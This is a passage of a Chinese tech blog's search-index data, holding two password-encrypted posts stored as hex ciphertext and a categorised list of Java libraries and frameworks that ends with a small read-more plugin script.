b95eb639f29f77a4878d88bee8c63a070041ca579391ab3ec5fd280f4b7d6e546959c67aeaaf609a898e02df14c9dba7f7b164550085cf4017f524cd3d918dafdc83d9e24ff5278395597eb23883403e903ac79bc0975381313a27bf5f20ecfc81fa3b8a0fc24a4a390d53cc50af1c1ddcc4084af5a8c11e6e590fe8ac9ede2dc7400acf6c5db82a40a7ca8bb555622bae6d57c5a634fbefae3d206f7854a96ed6283aa64f9e211d1c6443a9da7b9f058f81c3bac299e8acb6a7090b9d05fb560a6bae4befead1dd75259ea659577b57da53f600d9aa7eb3c39d9615dbd5c9629c65e9f93fc28a8cef345ccd7073eb293f17ef3a180ff4a8009ba93e821b2b6458bb68029fd1c9350e924e76777a5c79d8e805bc603581d8c0a11bde7983ed9355489436e0ed91432b4dc8f722cfc573895580589c5d425a06ed307aae5201a9236d0b7a477e07705a2ccbf307a66aa3877bf99e1bf633c5b6630022593570314f97e8b66c9421648ddbf1d72bb71d5a1b6e7f543712f1f431c91cc43b79720beb088c52e3a5d8cf78edbbb08a703b69631e35608b794c0a570d12ead050ce18fbede2e86b287f3961dfbc7265ca5b5b5ac57978bb87f3df4b0da91c73cf0c96d3aec6e88f151279862307419c2d27765ebed0fb1bbfd9d53672188b8ff4db0b70b5144da93d830c5db74344254eb022f61628dbe21d844699fd0648864c852235f806e6fb7b1a9c0cb44a5fd93c9e3e0b9bcd753236b2ba066f0c7d1f9c2ac7f57c3e73b84792df17bd9e7898c1bae987518be4a14a371e566ea0614e10ec5bc748c3e3fca6b56e0903f9f8333f36187f1bb9e92890a48f99c343124075a3d60389ac6fcfa33f69d911239de8c4e0820e874d5fccd69dca6bbf98d0cd663e637404e25a8ae012b2065743ae414e707da5856120b19dc209ade221643b43466b73304a01724f01a4b447156c97df85727ac255049472f8299006920dafc900b2b3bb53e829a6d5a2bca3f099836be0b19acca929fa2cc2c273292c6314bd71ae6eda48a4b9e772b38a80e90242a69afadd875663825f35f441976593e9614f10bd9330da5c300ce1ccdd657a266875d61e7491ca48f2cc427377754ca4a08602ab5d938f8b071517f83ac672b7cb7ba18e756be44ddf5caf4bb2a162a25bbd4d2c101f21c077d4113cf8692c489e15b257eb034f51f4ef50bdf9e4033efa4195ae8b938cbd8cf5a0b9559dee0ea14f74944cf19ba98852532a48095592a95e59567450d78762fed369f1efa29ed01de9514f642e5b30928e29bfb13042773cdc19c3aabb5bf9d8ed31448c973288301568c9dd152decbba3f2861613d36168a3f561f31e49293f79ee78deb46f32759db07976e07929ef9608874ca82fc36443ded697aca1ce5445a3ab8583ef68feae1fa57faf9c8b12ed184180f38fc1f128bbaa42c5f82420caa3eaeec03628973e71d4dec7d1c8354fc83759388da7ef9b5d0de17124a7da3bd3d9ae45106e51c581b338d01ac001d08162a849f452315ab71c4f3b5c39afe31252cda531144d1979ab988f33a1a01f37addc6bd72d171710b9446796adb75324409b9b53d2887feed0b132fa2ee45d5050ef8f761b648cdd73404718afd263dc7b646042c124169710855682b5b1fb7edd1ab0f82c7afa5625e69760470fa0f9130eb4fe1e07f3eb9408e3160491c14b5d5dcd430370ed22b6b3819115ded4db3ba161b5cd0236085a2ca0c27e50802e90bfb6b3be8cfc20c61ad65b90f520f7b151b2240758d6d475421fd309c5e92abe9b3cb04c3e89f29ba0f56f3ba6e58029fc65a4ffa0c44674d3786cb9428dbd36a5f80915c9a921d1deb222bf0f2225187b46bb4acf773aba717e02081abebf04f1ae5a9d7bbf5640a081972023259fb3700f07c6fd36fc44558151c3ceca0bc454602732dfa320e1b6a59ccda15193a4d48120d55fe31e3dbefea6924cb53b522179064018a27220d4636b6ffdb4b598dd1e02964c08c204ec57333559cfa8d5771d8079d1579e7cf24e42f4c772fcbb0529ae9247bb258f1e670d96989568598bc30e8b758421fbce808a56dc8d972aa69fb2a7836449ba8cca1dac3486287438834f7973b922db8be6115079a58b5f43da52a1f59fb603836f4425e1972ff8d626f1b56ff40f6c3bd5522999a8e7f4a53986f3d39d2ac4f2a59c50aee48ad916486922c4811a11e33926955074dd2414f20145e17e6d58d6e978b71d85870252e2cf25385282ed2c96a51edc34113bf2bcdfada9b0b48f79d2eeeb7b3f52d3c2422ab300761084d7c44ffe04f6eb95fccebc8ac84dcdbd8abe941f7834ed58c102691cbda8897eb5aa43f7f76da86b21d30b8c27417901ab0d362da5e5476983b2037b3f3eb354ac0654412a7fb16ee7c5348c9895d46d6629a127cd1cd63b9910569c56539632fb651aa5b29dd34d0238cff2eed6bac6513e1c0fe070fb4825f260a7cb6261257237f5e9d81db4b30c132d1921734ff93a9510b3f0e1eeaa3d65b7baf721052b4a961e21cae10b484dacfd7ac6926836844ef8f9b963d0f438ce28e92c89c8cf34228cf7747c9ca68244131b50f2aa99df6af73ac45b2c073f2add65775c7c796087cbf43fe3cdd83384515405310d2dac5bb949f33734f1f5b9875197474a0901a1afcd7733be13c03b786a464a26fd9648548f41967d05d0c6e0a78ae1d71d1672f0ae42ce16b1de3029df9c2dcfb84fe0d3406ef5f2726fea29d0b59cd3de283e7480cade7fbaf844d2d0610f120462921c3e774f75a41c20926b43ac5907303c0d0ce2cf3066bd438a12a22da91afc5af326478ce356892a52b689f24687cf97191fceeb5a7d8d9d6dc98f46d3e0f089441453066c31799b695cc75a8ce2b816b1efd377531ce23a82c5952b2dbfd2445a31a396e0f411befdd0d590a4ee373257d8959647e4a71b326aaeac24748617bff125719b62f710a622e868eb9e44b3a7550ae473536881aee6527f0eeaeced0baa68e055d90260bf40e02e1d62d479fbc2612fed544f829a090aaea4b0b20261a27b4475eb44379350666286dcb11f5a6fd105bb3df85881448a57c01d94608ee4f0276bb9b5cc61f3347157c352b6e2430f21a33643e20658aa7b502591e7952cc1b39ac46ce41b6e34bccf19a85b159f0d7136a5cfd156895ad51c657d071128b9ed77c53c9038092dcce247e6c3ee689acf105202e72722c0d67a5ad783633f9a825452ea9855c3cbf473b3a18fbb2d8fb9cb567b5f8f45357afea1b64eb24efd22a7693094758390a6a64a63e164b39a1c9943a60f829b7f38f54aeda8c0ece8570387a51deb575317d3860af4012df5cb219cfd1d87c923b35231518138e731511ab0b4a9f14d3778897c361abb63f3d69e1411c5d07de94a6d4367545f7eb4a6296bf0c5a646e2a262095d0f41e5434a3ac8090ca8b7ae9c8074b6ef0ddd1df3507ca942457c8cbe255458a407b64e69de6a6a9701b0194d276d5240580ec5cfb13045521991ca51a53accc2ce5c3ca851bf9eecc74b52bc17ad929fba37db4156d277b4c20c53d4534f69e5318d24df93debfcf5b10b358ef3f137948bc08826948081ab74586d3eda1065e4f1147d638ae2f09ea3e563902898c6622c7cf2b5a93cc5dfdccc945ccfbb1089b08f8e67c5de453593fad069681f6cbc47e70f9fc0990662c9973520f6514ef6a29532a635a8397dc5d5726a10702e6d3daad76ac51f262ba9efac75dfe7d9ab7ed401cbb9de7e93c8b4b86132bd83bf34d1ed127eb7758a3b500f55643c742f43ec90d903771f849d9080f1e8eeee73c4aef0895dd697dda605dc14c4a7f9326e8358a753b51bc2df76f47dc9babed15d17bfec9469508af6ff961c7df7911cfec810006a7c70fa7fcadd4e2936fad034f068df9a1de92f606220b2c0c027752b5723e44f66a1d5e44bcc9ba432567623caef78af0351b629f1a2cdcfcf71d785932ddbee68cf63457a16e5f22d85c14162ca1dd14c3a29be5e1abfe30b9c4a667f03a5d26c4d094a2943cd38e2cfe19f10cb5813ab2258ebe70eb9726615ebb4f96e6860ddadb9e8d9789de656beea9763cd2b4673c0985763e6879e56eb3ea85cc4d9d9a69804b865150528881afb6b170c64be82d586de8b898841989221a03c0c3165dbf7ccd8d2a608ec900b5a5cbf32dcc4b56790c794a614da54649a7805469abb8f2e8e4c5ecd8fdcc665887183fb29a68bc1f12ea2e86e8b9eb04ea193fe39978b85c7ba7b4380f9a4ae4285861e678a93950ccf1c4af2750bf7c5533f9e34b8d96688a1f99295ed2752892272b10418d025028710a040cd040e8e07ee1d1f85100aa8d4bf66a60b5eece8c2291cbbdf99268755aafd4ae4fdd778ad7cef47f41e2e88f8fd3ed317883f745612454b80e88df02cfbfbc19c1680ad250023e500248bd9acea5d3bdab9aee3012471e0a5300aeece38ddadb99934329446e04f6b3fdd3bc72d821fa88fc731f1c7a4c89c71838da8d114f7d06406908a2ff5ca221e1ed1e1b4f6ad8af2512b872d93fa113d69e54cd38bacbb7ec0b97338ed797785efc5801287abddf3b35cdae0676de952a23a879dc585e71047c3c60c5022c3c756a17bffd5ee210d3d4b683f80c08b0b447b0cf264f8386130fbd4a8bfa54bd14680fc9e86f1d397ab2106ae5499ecc6d43f63d4b353e9a185016a6971384a76d8f601b75ee3a8bcdb194a5309d1981ffbe61a54a0eb71fb69f3af8a40b94133e53c925499707763c309de953e21cd1fec55115358bf3aab09c31a803ba8dc8eed89e3375b7a0e63dff0e6b0fad13fc1e06fcb2a3bab599d48f7ee3e4f72c4679cda375f9fc7d3d463ce256dabf421bab34af13e6537b32cc58ee4e7a8368582fd550b1755e7e634cc06c6db60c9c5549dae6d28b9dd139ae9b48afaf34e93c0ac86c102d913cc4448c576a0348c597b22bcf1c6a9294adafb836726c9f867c6d6cd29e52bfb57c8bcd51ad821f721b0161fcaa1285c71e14d2c5a421aec95aec9ad0ffc294db7e2a9d9b37e00fe3988674115915a315e9efa2c1b7c098d4aac9b12aa2c46ddf0776a48fb125f48c704d41284ac5b4106bf42fc3e7cdd4276d0dc60372dbdbf3cf0b9f3c6d86cfed8cae65cfc910f4bcbcf754af0dd1992d49aa842f4ed9e91ebe648242686f1d474fa842896c627424bbebb5fbc3a0a2fa587cd29d36b712294cd963465fd0245e1f65f9d3d0b41ba8905b4a8c41055b7128ecea1718dd5636982f50c312614b12cb253995b7be9ecbd122774a54cc14acfa67d946d1bc75d5f5780f6ddcea4448f9973be9503c13078efaab18319b18ef7e97fd0852babd781531635060a007209c965cf907153b2abd46139fde3dc69ba0b25459c9e11610f4bb25136559fc5e5c4cd39093826a867af079bc6a0ad12d167cfdf1a0550212ae2e1b6b7ae057284da3252f63bbb3fd6352ffcbd9bdd25e3e7611c042a9e32a01b423403bc2e7174774c8d270c5d0cfdf4707b265fd012de2f24995039cc1f5d9b350353e54b3fe413c68db717acf161db5951a726b0f58f5bdf068e38c4eb28088f80b7a48092d2555c12eacbd86c8b1416e847916b67a2a549a908da3b004da220c9fab85e436fd718e1f998363e6656f5cefb69d8ebbefbdea849ac060539351ce7969c80d6c6d23178058e2e43a004570c36cef891dc5b0958b81f31870abc0f1a769d0d4efcc571ef47db12a8c1f36d50551e9f4a9707447cb81c7dd2be2a8eb52cab50625f241e4307487093fdb128777da796fe8fd7c061fe94644e684b88245cdea83fdd095c61e3bc4cb617eed1fb4aabdb42f4a8cb222057dca1079cc1423f860fc10da1c378d18d8edfdb487fa8af3da64584b782d0082c10b3d7d431427c2208ccadab4bc8887a25a07e1203b8e3cca748768742838f59fc567e889973c397e709b0b4e117dbc6587557bd5ebf8f7e9ee111524580431a02e21f41efb34a83762e6a2832a7e1e8d4bd281afa76e8410e194ddab4dbc815d0e35de11407d3495f8d3a578eeb5342da0a2f6a4f767720808029e4b479a802cb18866060711bdc02c48aaea64b547faa91cdc1140d077de4d48d5bc8b98aa2af13078d6c284ef16f138712c106eebca8f7843b8664d2e58f87c60bd1c7657fbb02470c318c68a5c6d6ababe62efc13023728310ba46425f60c0df7bd6d02acffe44e5c553007e8399d058376baebe29715a4451f3ddf23b8189f52ee930a864d75e2f1356ce2666271332cabaff7f9ca37d7876eb4a015ef690d9c0b8d77ea28b09ecfba46b9a7772781ad9c13f2033129cc8615ad67607b99bd2ac414415c8ffcd9b1344b0b9df13a5495b9869248de38959bcf1f55ca2fafdb2ecda0e8492c5266f7e8468295309143258c0c955734a3154f2a90928b889f47b101aabef9891b0a30c80311502269ddffe368b7aa02e129a8500aeeb73b0dac2af63adc6442f1e9d3346eba36602eb1a7458af7bf745351eed110221a74c3cc20d909b444dc3a442ef72f9e88f359943fc141b635d88698cc73b8cd7b12cb550d63e77149cc07a6b956a1a2c185982b7c8d4be8039e17d1320004179c0bcba4c79479454169b5cc0e911292c898029f563c39b9641e8a8db1c6e5af5944f18459f7c99f995c335e00dd85f7d7ad8e94a5cc65f37a480a3e9261101888af8ac14d30389f4cfa6bda8e07a5a590b083061886d1975240577d86a73ad4d539cb6e81e8d84b3ce0d14343d6597980ad1cc0faac07aa73473a9aee7fcde8ed3ea305960f72a052375d84eee58cc5f5bce1a5c7c81a6365d409b89988d080adc09e02ec040139cac9ea7a2d8aa21c268073fb701e41e4cd9cc786d1b7ab40c4aa34198c509ab486941ed7742f6d4442974739d663904d1eec5fd5e734bdaed628fcf4b0ce2d9485c58adca4f469ebea646c14bb893841de8aa946116fda0ea53984c10a51c9b5c4fa0ccdae7e30529f700cbd8fb6073ee8d7a2bb37b5a659b97644cb24d318520ba6bc40baf045c5e0ef351eaa5d7d32c309d656a2aab42ef4c8d3516fac4859a97c8e9bf52f5ba8e7b9231814a1f6c1b4e2fa1a52ea322dda16f5d234a7af1bd916cd68e0ce3789cf096189f012dceefa11639680d1326bfdbfbbf3dd38c7ca85989b345f5d7ee25d06f70e7d7ce89de4c458f7446cb7793a3945f69ccbd5e4725cce444aca4a185d2abbb699e40ba0e544c7f8b0d815d62675277476f5f50a0418b875016611a46684a82a10badd25e3d0f2221e14aea706daa55183c925e1bde1cb50f564ffb8f91c098bc7ef8342cdf3f2b18b943b54b0790f94cb40f542ce67696b9f4808a949f00317198806e0f3bda60726897e0e4d9f631e811a230f98ec79cad4801db74a5c6eee5b2873d218a60355494bdc0b76d4dbe3aa27ed3ed48588bd16eded4f7c1391325bd969eeb9f8ee8dfb48797a3fb4c3288ca1c04d6bd3cdc88f0c90ca94c3d64bfd7aa0158cc7908c5ef2e916782454373bfdac1ddce2bee170503b87026d9ece42b79ef40a6edb0168832cf05adbba868ef2744d6e9c48e02efac54596772196e1e1fcc7abbccfcc82239c5f4bf9c77e30fdd93433e0e44c96be01b112834f116322909d483dd280cb6ab147ad265f045bd8ac6824891049c6cd2f5a2fdc86569b4913c8f9697ba20fa9a1818e0c44d465a2ff39e4b1899b17f58c6b630184452c91d94e352fb56eb48dfd7c2477fbd46414a109d8eb65398320990accff80a7f40c1f09c6aa36814a19632c1343e036a853e897c9a5e9b9712ce6c6e3cccb1e8f92f6733a64dddd8a10e1e32b5c74e7d48bd0b97ef1a443c047ac07875dfa50861c36c694733589d98d3499b612f80139740b07ec31b47eb21347dfd3f2f7c50eac3690693c5f018339f94504236f780b1c8710a4416a6774681ad945c197b7a9bc3ac03d128ff09e6efdc5c79f24c78142d0f3133fddc9abb3f713d4988648daa2016471eb422b3a87660d8aec455f7b698477414b7f2277d30e76db735c2377a7c99776d9c3c99e62cc2f48f06bb97c25e6c45d7f6b57af6e1677a79422e248b15882acce32473f99a1754ec457401450e4fa56a02fee1c952b9e0b53ee82eb5af42d4af157bab7c5e0f49186500e03f8f683a21b6bd3742614b0b62ca531ce3e1da0c0c36847150ed261a28a1386f8a74ac39db5008c8b3ff884d8f6197609412803f193d3a7d2bd2c0bea94beaf477186aebdf51da547de382fd6513608ae251b36ab6dd849895727b50e6dce2fd05f5ac8e1d8d1d61e7db005f61feda5152e627d5f9bb767ddd44e519745279e3ea3cc740814cc9c49bb1f82dfca05d2e8a7c27f05b9f52f44f03f0e75685d744c5ad29c2e7ac23aa46a02f321f178c7e5797d0ae64b6b3e1bbd2e5df9b91db01cca2d1b424d52397d2c1c7f328c927fe370df28ed7e5b85e676813c6822817306ec88354c0c5e13ff86b016108c8689e271c889db51939308b2760a92638b2890431c54a698ec1c737fa80c491945232cdfe08d29fdcca64fe92168b964d8ba63a62f03b1400324e3c544d063ad3b65b625e4af3471e8ec7f5dbf089d296a0a1af68ee76dbc3951eeed192c50d27ee16b63f6f40d1d14dfd89b04f9076875aeaf9024b3f8a3b581b26a5f1c8acc440b35d16629c0784a9d5952aca38441a7b37c9c29c6bf732200db487d60031ae2a9f6fda3fafc2d63cc7e77b8cbf31381ddd49dddb26178b18f518b9e48f3cefce3bb100a1ad7a34ab1db0d12c8eb1a9f0798f88a5f3d194013427b49bb05df8e2237fe4a857f89a55882d23314ee694967261995eeb369a1b5d9d048389875c7ca8b1e7bf15ee76ab1db2e007ad5a91c6bf54c85851befb8c1526a72f9b889c5059774c38fa3ea89d5620aa0795e8aa20ddf375005b9018ec404da84214435e43399f921740b7075cafd44f5ca7ef58a1cadcb8594169bb2e72d22eeea1b358d25069c5b04b58ae0fc93dbdd53b25432ba7e79345c5eb0a8c22ddb9faf7c4f2e31e889bc0a87b2fcca043ab6b67f4300e178ad9dda65f92c5e63c19c3c0ef8177a0151e696a3cffd6a9e459ae0a05578c9055d16fcc4f173742be7bb59b9816084cda9b6b655c2049dd5060ceb48c556a01ec7c4f59e82e84e3384c372e0a90218236df43841541f5481fc0aa0925ba123d4aa7367fd6eda5e051e9db10b97bc72dcf49620a0dc7551c6b742576553fd3ca1ce128fec0b2d137f9c44dbd4a72ae8113565bad360850bddadb3478406823c4112efb6583693ff35025eadf19618e1ca0cd4fe969aaf6fccb4baa47de53d22e99b82feccfb4460fd829233643f9d97e9f6864f58cf971f05e5f9b1c2e6677e0cc53910bc64d1f2d08c48a58f07776be7602a2b938ec66121d11ed1def941ad565146ff230152ca333f5caa4c8b066b83a7378c8e58254833826667607dd882ac9c95399332c16961c7862ecbdc0f4f38073c00a2802733b315436b5b6abf5c7c35116ea8b056d20b4d5cdb185ec63813caec2b79777ddbdc421bde1fffdb54f7392c036c5f8700ff21b172591f2e218f0e9f0e416a4c0a0c320137ce850b68a1436131ed66372bfa11a8b5a2ca661b82c9943f2035a52b9a4f6bbccb730bd46fe736c7fafb4a484a8aa9a7f19b1521351e8be9fa543e25cf30661379d955b19ebed91131b0916d8372779aafbe70f382173e66530c8d2ac6ab7d950fbfd52ca0f69515ff6d38eb80a9bc7bf80dd58c17d23805d9bf8f14fef077099a19bee3e326c80bf29d07d9d7016856add054d6ac5d20d1e1efb3a7cdb3c9856c2d14bbcd7e1a52d014e3ebeeebe6a2a2386469b87fd1633b7c46495a30d8ce1b73aa692f8fc0da4b22b55d7c93b16a5ae7d7bce1d36e0be1e388f71b07d58eabb5cda11aaf39dbe36ff65ca536c28e0252c1d4870ea24615f1be5ed4ba350deed83ae892ac9ec692b84b2514a83dcb2663ba1cb121e1f00263b2d243185ab2d30d216560c6c77322b98faad728d0021a36aae99f488d078514e0dded5038ee3818f15a7e00a5fb969a797230b100ef033ba130383c2553fe124461f280da64ae82dc6f3244869e507146606b4e878fe1c6b22553bf54ccf87bec7891e2c40b5bd5b249111c5c6846259ba84019b34b75510469c22b02838a7c7ced13b4d38a067016d2d147007deb660c938693e1da339f189a196815736885422b037515d95a6261828fdcc817fc96bd0ee8a104a24c40e5d8ed327d49a0a3d48a642ce9a54ec965ec3776480537b541ecde14a7f4522b362f3bfdb5ce6002f9c238c246d9b729ca68ebe06419160df8525c1f730c073855f9a4c779c041b701ed49e816171919fd792427a5f1d3e7bc78872a57affeed4951e1b9b0bc3328218c6d64d061531421d8f620a67fa3aa8297ce1cadccd9564de53663208cb7a980da2c561667597993499034e125c52461dfbd90a5b2271d3d8a479973db34a859c941c815e18f27bb3eeac8c407e82729e3ad8e0db4c75dd3374c44f008ba84dd562cd00a1e3703b91941c02c57f4858882001ec17a73f7f75a46f346528a55cec589822e821307b9fa4ed39829a73181400c2873266e2b3396cc48ab71210b588708f2a4a8cd231391f8a776fd1d5fdf450f255bc464d089299375a98e39594f1438c4a027f141816b888bdc9f3b801fceaef1dac356c2e56f0a744b4d0a286e14629762c77f3d6f53da95c19eeb6c603107b603572e3d9a0d920a7bb52f3342a5e42c3e570f6bb3580582ff14eab11a1f7e5d66e24cbff51969f9916dfa402f86904cc2ffd1073393c20e75bb60ee5781a9622da95b4b68a49fafe4995aca763e4998250457da6a8498b943486f301a9b39c9192210bd247521a48b6a805c7df22668d76837c353e8bc7759a9bdf78b05680e37d7551310f6cc36131640799caa2aeb7e1edf59f1681098e7fcd8f2bab37c43f179ba03410d55e3fbf7694d41f050e3f7c137897e806126e7278b4655983920cd3e6d3a7e96fbe9eaa39c5eddd425b79b9673a81930bce7f5e43585a4be989dd19d0fd68abed08d9411d277ed4a4c5997b15810cb3763efacefacd3b286ece52f808248bc1bae8013eb32c12070f7f99be765737a018850313c89342bd2923cdc6161d4add2b152356edcfc5365987b6581ac57e000dcf9dbb0f804e1e6b1d6926143208947c9927366ad298cd4bf87fabd6303d1f12ff511c8a25b15b775aa21975e659462bb199f26b821172e65555b03b106c195d2c974055b7ab12cad42dd77c436f1405272f897455171e13d95c834976eeebd3478e051053c77a1fcf51b98610c350954253ec6bf35709123d4b4cb7c3a86605504fd1444d18b1e9bc831e10e9a97fd37d6bfaa856ec6c41ea9defc895734b87f6d6cd1647fa7a6f7ab545797d01b2f82b196d805cf9c4787c174e5e1e4a83884400ed44ec69191fa93027a306146b2d7e719c4afb6317607812a8336552f41e2a9703eeff28493c07535bd4326ee52bd74a20f887182dc82ea11206e822d554a08794699800cc699aad79d0ecd8ee5d6fc602f277b7eb58225143b57aa82897015cb4908dccd03531a1e9a80f111e49a25e3f806be55ca1bec221560f6672c8e79f6594844fda0ad31868d8166d82507d8c3dab75e28721c6da439579794ca0a9aa85a9f4fa142cae54c8a4d8bfa2468a2bac4a46f3d946186623dd6f8333da2efc478be16e8d48b4d06303820d9c2f6fa02c10514b0f4d020953b8d4dd0617fa8cb57ac8d3e12203e126e059524a1b83bdb95c6a98d4422c8d85024f05f5348b0d6ac016fb18ddae3449c31feb4a0e817bbd6b8340fd3fefbc71203652e99248f70a7e14e1db9155f2cfe08cbbafd0ae52eaacfe50aa29f78e5a33138c62e700568eb1d2c08179d1b32fc3ea80a6f0b3ccbfd1ca23dd996232e738110e9f6cdae109b54208f61344931f5796faeac9242df1836fe2e265f186a927d3d7deb08dea7e17d51aacc451eb147ea73fb2d596256ce92f7b23c0d99b7986ea08112738c45abf97401829599934af440e1602f1920e09423b50341cd9a67d1690601aa4933bb7edf3508b7d0b64875856f46520a7a50f9766e1426aa334325a7c7455ceea81e9b9829e2e1ced1b7a6574f284e43ce646eeb29639402fae5da96114452086bbb3a5681a2b87045c781bab9603d0a20b71384ad52e5a9a04b6115fb023bd4274cd6abd336345b2d30a54d08cb7554cefcadd42615f48e05aad974c74e67492fb8b90b2f69fba23d1d07ae941407bda9ebabf25cdb0c20fb0c9e69ce266d6bd261d7e2eaf7e59c67900da21b926f86a7985faeff34f29e9634ec2be50a68b1e13ae5f8a9fb676c5500dd5a7a27a96aec36cc540598e263b6da937daec5e3db3d0be8129670db371f59cc950cd1df548640439e9a296c0884087bda270c57d85f5c092687cfea5760b978ecfb65a8f188088ccddbd069b9481c5ae3973ebc556ca7f35decc966ed6764a67152586e759a8fa68d30df841ff6c086ecad09ef3823746824eda76d135e3ea120dcfb1a0af5f1be5c17b2bb39470d427bc1793175386fda61c1ebd43013f419fb7550db715a184d4930969f1bb5d4f50576a1292b062040bd5efc8bcc39abf008e6a806c53577eef2742b2f701d6fda71b60e5706e281931ec6ea63449d322781bf2dd3848b66ac5a33fed6456726f210d5544f61517b64865767945adf0fef09f1335c00e4369600435a37054b1da3ec278876a4382bd9a805309974aa3f4163717173bbc59 请 输 入 阅 读 密 码.",tags:"加密博客 开源"},{title:"Java 技术分类汇总（持续更新中）",url:"/posts/8cbb7cbe.html",text:'技术选型原则业务驱动技术，技术的出现是为了更好地支撑业务，离开业务谈技术都是耍流氓。选型维度可参考以下几方面：框架成熟度、社区热度、可维护性、开发效率、运行效率、成功案例、文档丰富程度、学习曲线。 常用类库、框架SQL 优化：P6Spy Web 爬虫：Webmagic Java 诊断工具：Arthas 数据导出：POI、EasyPOI Binlog 解析工具：Maxwell 代码混淆：Zelix KlassMaster Reids 客户端：Jedis、Lettuce 权限安全：Shiro、Spring Security 搜索引擎：Lucene、Solr、ElasticSearch 数据库连接池：C3P0、DBCP、Druid、HikariCP HTTP 请求：OkHttp、Retrofit、Apache HttpClient 限流：Bucket4j、RateLimitJ、RateLimiter（Guava） 模版引擎：FreeMarker、Thymeleaf、Velocity、Beetl 工具库：Guava、Apache Commons、Joda Time、Hutool API 文档：Spring REST Docs、Swagger2、OpenAPI3、APIJSON 响应式编程：RxJava、Reactor、Vert.x、Akka Streams、Ratpack 序列化：ProtoBuf、Thrift、Kryo、FST、Gson、FastJson、Jackson、Hessian 缓存：Ehcache、Caffeine 、Spring Cache、Guava Cache、JetCache、J2Cache、Hazelcast 基础开发框架：Struts2、Spring MVC、Spring、Hibernate、MyBatis、Spring WebFlux 高可用、高性能、高并发、高扩展、分布式、微服务技术微服务：Spring Boot、Spring Cloud、Spring Cloud Alibaba、Quarkus、Helidon、Micronaut、GraalVM 分布式锁：Redission、ZooKeeper、Chubby RPC 框架：gRPC、Thrift、Dubbo、Sofa-RPC、Motan、ZBUS、HSF 服务监控：Spring Boot Admin、SkyWalking、Cacti、Zabbix、Nagios、Prometheus、Cat、Metrics、Atlas、Spectator、Grafana、Open Falcon 消息队列：Kafka、RabbitMQ、ActiveMQ、RocketMQ、ZeroMQ、RedisMQ、ZUBS 全链路跟踪：Zipkin、Pinpoint、Brave、Dapper、JVM-SANDBOX 服务注册与发现：Zookeeper、Eureka、Nacos、Consul、Etcd3、Sofa 分布式任务调度：Elastic-Job、XXL-JOB、Saturn、DolphinScheduler 分布式统一配置中心：Spring Cloud Config、Consul、Zookeeper、Nacos、Apollo、Etcd3、Disconf、Chef 分布式文件系统：HDFS、FastDFS、TFS、GlusterFS、Ceph、MooseFS 服务路由（API 网关）：Gateway、Zuul、Kong、OpenResty、ShenYu、Linkerd、Tyk、Orange 服务熔断、服务降级：Hystrix、Sentinel、Enovy 数据库中间件：MyCat、ShardingSphere、Cobar、Atlas、DBProxy、Heisenberg、CDS、DDB、OneProxy、Amoeba 数据库：MySQL、PostgreSQL、MongoDB、Redis、Memcached、HBase、Ignite、Oracle、DB2、SQL Server 大数据技术：Spark 生态圈、Hadoop、HDFS、Zookeeper、Yarn、Hive、Hbase、Storm、Flume、Sqoop、OOzie、Impala、ClickHouse、Flink 分布式事务：Seata、RabbitMQ 柔性事务 分布式全局唯一 ID：SnowFlake、UidGenerator、Leaf 分布式系统其他基础技术：CAS 单点登录、分布式 Session 分布式数据库其他基础技术：数据库集群、主从同步、读写分离、分库分表、分片分区 Linux、编译构建、持续集成、虚拟化技术编译构建：Maven、Gradle、Ant、Bazel Linux 系统：CentOS、Debian、Ubuntu、SUSE 持续集成：Jenkins、Hudson、Bamboo、Spinnaker Web 服务器：Apache、Tomcat、Jetty、Undertow、Weblogic、Websphere、TomEE、Resin、WildFly、GlassFish、Payara 虚拟化：Docker、Swarm、Machine、Compose、Kubernetes、Mesos（Day2IQ）、Rancher、Podman、Skopeo、Buildah 负载均衡、反向代理、缓存服务器：LVS、Nginx、Tengine、OpenResty、HAProxy、Keepalived、Heartbeat、Varnish、Squid var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"前端开源项目收藏",url:"/posts/639f1159.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b14ffa373b90a0e15b335b031150466db31919ec5a50368b372b4188aabc8fe3ef5fc95ad71374c2bda52965deb4b772cc405d22243f0063800d66d91c87b493f864fa3b10c6306b855de7bd6e4d041e62489181e4f99e9ff6958169cd00debc59e6743bb50c31beb55598a6b0075754748ced32168a748469731d25c2b71e19a7a3f0e11605f3bf3b476e6f78887df72d95076f095d2bd936af2c7f230e1cfd3e7ed9d908ee26eec3c4d53bfb5ade1cd69f129baccb4040696f22d6af9156942299c479fbfd22321fe5be0cec051e0b35b6c454aa0ff4bd7eb858dbb0d8cec5a48584e366cf12535f3dd141178f1e51bb64d15fa5c439e275d5ff7eb082d223ab0b438b6be6d18c35d830d7be5766a2dd93f1b32d438ec7196b8b9bac2205d5639fe4f67d7a148dafe0fdaadc0043924950d356b1bbd31e1ffbd99890a63d451ed9df07c49faa9f481d54aeb7f43a31db0ce862613b56ef44cea93ef5df7adf65f17cbc5ee4f722afdaab8a2c6e073d84c9eed668ab82e5b15062e3475b788299f320aae718b6ae1ab8ff52b382056099fb35e18c431123ea0beff511c21d82b1f3bc1fcacafeb74997e0ba0adfd67817240e00ee7c8af57c23e20a63e90d21ecc757144f64fa16040d141f77b702b16718f033ddd8994f940e8e63dc5b5bb607e89fa8fea67f24cb27b9d8d0973570bb777b79fc1a4a061aac8468f455c8c6359650e62de1daa35ea1caf7dc7511420e9a712a353292469a885720ef7d94f2867981bd3d3ce18ed311a78eb1ac85f5f474b1404c55b169fc8364957185a5e9b8428f2706280f4a2c072e156da2dfdff50e2122f6155781510b2940ec9174bdf9b5faa3ef88736824b5460ca4986f201195cbb48d33f20d3acb7e9effe97363e78bdc4ce430385d200b5b125744ea70332ee47afd0fa5f4f1eaccd2d6f95474eac149ff9dca0e196ac09fd3c1ba548357e4f558965eda3bd5a5644856aa423bac063e8e9a6eedeca6fce397d299fe04a67966b52950ce454846eeeaecb2b8102c4bbd67d919e40e7212991e5a5ae625076f2f44495692368acd60f87c55168217e752649ec